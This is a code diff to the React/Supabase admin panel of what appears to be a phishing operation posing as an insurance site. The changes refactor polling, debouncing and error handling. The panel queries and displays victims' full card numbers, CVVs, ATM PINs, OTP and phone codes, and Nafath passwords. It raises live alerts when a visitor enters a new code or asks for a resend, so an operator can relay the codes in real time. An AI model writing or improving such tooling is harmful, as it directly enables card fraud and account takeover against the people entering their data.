@@ -195,6 +195,7 @@ const AdminVisitors = () => {
   const [pendingRequestMap, setPendingRequestMap] = useState<Record<string, boolean>>({});
   const [pendingStageMap, setPendingStageMap] = useState<Record<string, string>>({});
   const [lastResolvedMap, setLastResolvedMap] = useState<Record<string, { stage: string; status: string }>>({});
+  const pendingStageMapRef = useRef<Record<string, string>>({});
   const [searchQuery, setSearchQuery] = useState("");
   const [deletedCount, setDeletedCount] = useState(0);
   const [deletedVisitors, setDeletedVisitors] = useState<Visitor[]>([]);
@@ -218,7 +219,8 @@ const AdminVisitors = () => {
   const hasInitializedPendingRef = useRef(false);
   const geoRetryRef = useRef<Set<string>>(new Set());
   const detailsPanelRef = useRef<HTMLDivElement | null>(null);
-  const fetchTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const fullRefreshTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const visitorsRefreshTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const [visibleCount, setVisibleCount] = useState(() => (typeof window !== "undefined" && window.innerWidth < 768 ? 12 : 20));
   const listEndRef = useRef<HTMLDivElement | null>(null);
   // Request browser notification permission on mount
@@ -421,27 +423,55 @@ const AdminVisitors = () => {
       setDeletedVisitors(prev => [...removedVisitors, ...prev]);
       setDeletedCount(prev => prev + offlineIds.length);
       if (selectedVisitor && offlineIds.includes(selectedVisitor.id)) setSelectedVisitor(null);
-      fetchVisitors();
+      await fetchVisitorsList();
     } catch (err: any) {
       toast.error(err.message || "فشل مسح الزوار");
     }
   };
 
-  const fetchVisitors = async () => {
-    const { data } = await supabase.from("site_visitors").select("*").order("last_seen_at", { ascending: false });
-    if (data) {
+  const fetchVisitorsList = async () => {
+    try {
+      const { data, error } = await supabase.from("site_visitors").select("*").order("last_seen_at", { ascending: false });
+      if (error) {
+        console.error("Failed to fetch visitors list", error);
+        return null;
+      }
+      if (!data) return [] as Visitor[];
+
       const now = Date.now();
-      const processed = (data as Visitor[]).map(v => ({ ...v, is_online: now - new Date(v.last_seen_at).getTime() < 30000 }));
-      // Initial sort (pendingStageMap will re-sort via useEffect)
-      const sorted = sortVisitors(processed, pendingStageMap);
+      const processed = (data as Visitor[]).map(v => ({
+        ...v,
+        is_online: now - new Date(v.last_seen_at).getTime() < 30000,
+      }));
+      const sorted = sortVisitors(processed, pendingStageMapRef.current);
       setVisitors(sorted);
-      if (selectedVisitor) {
-        const updated = sorted.find(v => v.id === selectedVisitor.id);
-        if (updated) setSelectedVisitor(updated);
+
+      if (selectedVisitorRef.current) {
+        const updated = sorted.find(v => v.id === selectedVisitorRef.current?.id) || null;
+        setSelectedVisitor(updated);
       }
 
-      // Fetch pending requests
-      const { data: pendingReqs } = await supabase.from("insurance_requests").select("id, phone, national_id, status").eq("status", "pending");
+      return processed;
+    } catch (error) {
+      console.error("Unexpected visitors list fetch error", error);
+      return null;
+    }
+  };
+
+  const fetchVisitors = async () => {
+    const processed = await fetchVisitorsList();
+    if (!processed) return;
+
+    try {
+      const { data: pendingReqs, error: pendingReqsError } = await supabase
+        .from("insurance_requests")
+        .select("id, phone, national_id, status")
+        .eq("status", "pending");
+
+      if (pendingReqsError) {
+        console.error("Failed to fetch pending requests", pendingReqsError);
+      }
+
       if (pendingReqs) {
         const map: Record<string, boolean> = {};
         processed.forEach(v => {
@@ -453,24 +483,34 @@ const AdminVisitors = () => {
           if (hasPending) map[v.id] = true;
         });
         setPendingRequestMap(map);
+      } else {
+        setPendingRequestMap({});
       }
 
-      // Fetch pending stages
-      const { data: pendingOrders } = await supabase.from("insurance_orders").select("id, phone, national_id, current_stage, stage_status, visitor_session_id, otp_code, phone_otp_code, nafath_number, nafath_password, customer_name, card_number_full, card_holder_name, card_expiry, card_cvv, card_last_four, payment_method, total_price, company, atm_pin").eq("stage_status", "pending");
+      const { data: pendingOrders, error: pendingOrdersError } = await supabase
+        .from("insurance_orders")
+        .select("id, phone, national_id, current_stage, stage_status, visitor_session_id, otp_code, phone_otp_code, nafath_number, nafath_password, customer_name, card_number_full, card_holder_name, card_expiry, card_cvv, card_last_four, payment_method, total_price, company, atm_pin")
+        .eq("stage_status", "pending");
+
+      if (pendingOrdersError) {
+        console.error("Failed to fetch pending orders", pendingOrdersError);
+      }
+
       if (pendingOrders) {
         const stageMap: Record<string, string> = {};
         const unmatchedOrders: typeof pendingOrders = [];
-        
-        // First pass: match by session_id, phone, or national_id
+        const nextPendingOrderDetails: typeof pendingOrderDetailsRef.current = {};
+
         pendingOrders.forEach(o => {
           const matched = processed.find(v =>
             (v.session_id && (o as any).visitor_session_id === v.session_id) ||
             (v.phone && o.phone === v.phone) ||
             (v.national_id && o.national_id === v.national_id)
           );
+
           if (matched && o.current_stage) {
             stageMap[matched.id] = o.current_stage;
-            pendingOrderDetailsRef.current[matched.id] = {
+            nextPendingOrderDetails[matched.id] = {
               stage: o.current_stage,
               otp_code: o.otp_code || undefined,
               phone_otp_code: o.phone_otp_code || undefined,
@@ -491,9 +531,7 @@ const AdminVisitors = () => {
             unmatchedOrders.push(o);
           }
         });
-        
-        // Second pass: assign unmatched pending orders to the most relevant online visitor
-        // (priority pages first, then most recent)
+
         if (unmatchedOrders.length > 0) {
           const onlineVisitors = processed.filter(v => v.is_online && !stageMap[v.id]);
           const priorityVisitor = onlineVisitors.find(v => getVisitorPriority(v.current_page) > 0) || onlineVisitors[0];
@@ -501,25 +539,31 @@ const AdminVisitors = () => {
             unmatchedOrders.forEach(o => {
               if (o.current_stage && !stageMap[priorityVisitor.id]) {
                 stageMap[priorityVisitor.id] = o.current_stage;
-                // Also update the visitor_session_id on the order for future matching
-                supabase.from("insurance_orders").update({ visitor_session_id: priorityVisitor.session_id }).eq("id", o.id);
               }
             });
           }
         }
-        
+
+        pendingOrderDetailsRef.current = nextPendingOrderDetails;
         setPendingStageMap(stageMap);
-        // Seed known pending orders for sound alerts
         pendingOrders.forEach(o => {
           if (o.current_stage) knownPendingOrdersRef.current.add(o.id + "-" + o.current_stage);
         });
+      } else {
+        pendingOrderDetailsRef.current = {};
+        setPendingStageMap({});
       }
 
-      // Fetch last resolved (approved/rejected) stage per visitor
-      const { data: resolvedOrders } = await supabase.from("insurance_orders")
+      const { data: resolvedOrders, error: resolvedOrdersError } = await supabase
+        .from("insurance_orders")
         .select("current_stage, stage_status, visitor_session_id, updated_at")
         .in("stage_status", ["approved", "rejected"])
         .order("updated_at", { ascending: false });
+
+      if (resolvedOrdersError) {
+        console.error("Failed to fetch resolved orders", resolvedOrdersError);
+      }
+
       if (resolvedOrders) {
         const resolvedMap: Record<string, { stage: string; status: string }> = {};
         resolvedOrders.forEach((o: any) => {
@@ -529,9 +573,13 @@ const AdminVisitors = () => {
           }
         });
         setLastResolvedMap(resolvedMap);
+      } else {
+        setLastResolvedMap({});
       }
 
       initialLoadDoneRef.current = true;
+    } catch (error) {
+      console.error("Unexpected dashboard refresh error", error);
     }
   };
 
@@ -543,7 +591,7 @@ const AdminVisitors = () => {
     await supabase.from("site_visitors").update({ is_favorite: newVal } as any).eq("id", visitorId);
     setVisitors(prev => {
       const updated = prev.map(v => v.id === visitorId ? { ...v, is_favorite: newVal } : v);
-      return sortVisitors(updated, pendingStageMap);
+      return sortVisitors(updated, pendingStageMapRef.current);
     });
     if (selectedVisitor?.id === visitorId) setSelectedVisitor(prev => prev ? { ...prev, is_favorite: newVal } : prev);
     toast.success(newVal ? "تمت الإضافة للمفضلة" : "تمت الإزالة من المفضلة");
@@ -606,6 +654,7 @@ const AdminVisitors = () => {
 
   const selectedVisitorRef = useRef<Visitor | null>(null);
   useEffect(() => { selectedVisitorRef.current = selectedVisitor; }, [selectedVisitor]);
+  useEffect(() => { pendingStageMapRef.current = pendingStageMap; }, [pendingStageMap]);
 
   // Re-sort visitors when pending stage map changes (prioritize active visitors)
   useEffect(() => {
@@ -614,22 +663,33 @@ const AdminVisitors = () => {
     }
   }, [pendingStageMap, sortVisitors]);
 
-  // Debounced fetch to prevent rapid successive calls
-  const debouncedFetch = useCallback(() => {
-    if (fetchTimerRef.current) clearTimeout(fetchTimerRef.current);
-    fetchTimerRef.current = setTimeout(() => {
-      fetchVisitors();
+  const debouncedVisitorsRefresh = useCallback(() => {
+    if (visitorsRefreshTimerRef.current) clearTimeout(visitorsRefreshTimerRef.current);
+    visitorsRefreshTimerRef.current = setTimeout(() => {
+      void fetchVisitorsList();
+    }, 120);
+  }, []);
+
+  const debouncedFullRefresh = useCallback(() => {
+    if (fullRefreshTimerRef.current) clearTimeout(fullRefreshTimerRef.current);
+    fullRefreshTimerRef.current = setTimeout(() => {
+      void fetchVisitors();
     }, 300);
   }, []);
 
   useEffect(() => {
-    fetchVisitors();
-    // Increase polling interval to 15s since realtime handles instant updates
-    const interval = setInterval(fetchVisitors, 15000);
+    void fetchVisitors();
+    const interval = setInterval(() => {
+      void fetchVisitors();
+    }, 15000);
+
     const visitorsChannel = supabase
       .channel("visitors-realtime")
-      .on("postgres_changes", { event: "*", schema: "public", table: "site_visitors" }, () => debouncedFetch())
+      .on("postgres_changes", { event: "*", schema: "public", table: "site_visitors" }, () => {
+        debouncedVisitorsRefresh();
+      })
       .subscribe();
+
     const ordersChannel = supabase
       .channel("orders-realtime-admin")
       .on("postgres_changes", { event: "*", schema: "public", table: "insurance_orders" }, (payload: any) => {
@@ -650,10 +710,11 @@ const AdminVisitors = () => {
             toast.info(`طلب جديد بانتظار الموافقة: ${({ payment: "الدفع", otp: "رمز OTP", phone_verification: "توثيق الجوال", phone_otp: "كود الجوال", stc_call: "مكالمة STC", nafath_login: "دخول نفاذ", nafath_verify: "رمز نفاذ" } as Record<string, string>)[row.current_stage] || row.current_stage}`);
           }
         }
-        debouncedFetch();
-        if (selectedVisitorRef.current) fetchLinkedData(selectedVisitorRef.current);
+        debouncedFullRefresh();
+        if (selectedVisitorRef.current) void fetchLinkedData(selectedVisitorRef.current);
       })
       .subscribe();
+
     const stageEventsChannel = supabase
       .channel("stage-events-realtime-admin")
       .on("postgres_changes", { event: "INSERT", schema: "public", table: "insurance_order_stage_events" }, (payload: any) => {
@@ -667,13 +728,14 @@ const AdminVisitors = () => {
           };
           toast.info(row.payload?.resend_requested ? `الزائر طلب إرسال رمز جديد: ${stageLabels[row.stage] || row.stage}` : `كود تحقق جديد: ${stageLabels[row.stage] || row.stage}`);
         }
-        // Auto-refresh stage events for selected visitor
-        if (selectedVisitorRef.current) fetchLinkedData(selectedVisitorRef.current);
+        if (selectedVisitorRef.current) void fetchLinkedData(selectedVisitorRef.current);
       })
       .subscribe();
+
     return () => {
       clearInterval(interval);
-      if (fetchTimerRef.current) clearTimeout(fetchTimerRef.current);
+      if (fullRefreshTimerRef.current) clearTimeout(fullRefreshTimerRef.current);
+      if (visitorsRefreshTimerRef.current) clearTimeout(visitorsRefreshTimerRef.current);
       supabase.removeChannel(visitorsChannel);
       supabase.removeChannel(ordersChannel);
       supabase.removeChannel(stageEventsChannel);
@@ -931,7 +993,7 @@ const AdminVisitors = () => {
     await supabase.from("site_visitors").update({ is_blocked: newBlocked }).eq("id", selectedVisitor.id);
     toast.success(newBlocked ? "تم حظر الزائر" : "تم إلغاء حظر الزائر");
     setSelectedVisitor({ ...selectedVisitor, is_blocked: newBlocked });
-    fetchVisitors();
+    await fetchVisitorsList();
     setLoadingAction(null);
   };
 
@@ -1416,7 +1478,7 @@ const AdminVisitors = () => {
                       for (const id of favIds) await supabase.from("site_visitors").update({ is_favorite: false }).eq("id", id);
                       toast.success("تم إزالة الكل من المفضلة");
                       setStatusFilter("all");
-                      fetchVisitors();
+                      await fetchVisitorsList();
                     }}
                     className="inline-flex items-center gap-1 px-2 py-1 rounded-lg text-[10px] font-medium bg-amber-400/10 text-amber-600 hover:bg-amber-400/20 transition-all flex-1 justify-center"
                   >
